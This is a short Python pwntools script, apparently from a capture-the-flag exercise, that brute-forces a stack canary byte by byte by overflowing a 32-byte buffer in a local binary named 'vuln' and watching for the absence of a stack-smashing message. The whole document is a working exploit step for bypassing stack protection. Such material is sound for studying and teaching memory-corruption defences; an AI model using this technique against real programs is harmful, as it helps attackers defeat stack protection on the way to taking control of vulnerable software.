from pwn import *

# Canary Cracking
canary = ''
for i in range(1, 5):
  for e in range(256):
    sh = process('./vuln')
    sh.sendlineafter('Please enter the length of the entry:\n> ', str(32+i))
    sh.sendlineafter('Input> ', 'a'*32+canary+chr(e))
    output = sh.recvall()
    if 'Stack Smashing Detected' not in output:
      print output 
      canary += chr(e)
      break
print canary 